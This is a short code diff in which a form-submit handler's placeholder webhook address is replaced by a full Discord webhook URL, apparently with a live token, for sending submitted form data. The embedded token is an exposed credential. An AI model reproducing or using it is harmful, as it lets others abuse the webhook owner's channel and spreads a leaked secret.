@@ -25,7 +25,7 @@ form.addEventListener('submit', function(event) {
   };
 
   // Send data to Discord webhook
-  fetch('YOUR_WEBHOOK_URL', {
+  fetch('https://discord.com/api/webhooks/1186573662229368863/vYWTfLedOtIxe9YmMmlhmDwiB-4hjFMRf5q7PHP2USF5LTuwkwocqg7lsrHHDFPo6iLF', {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json',
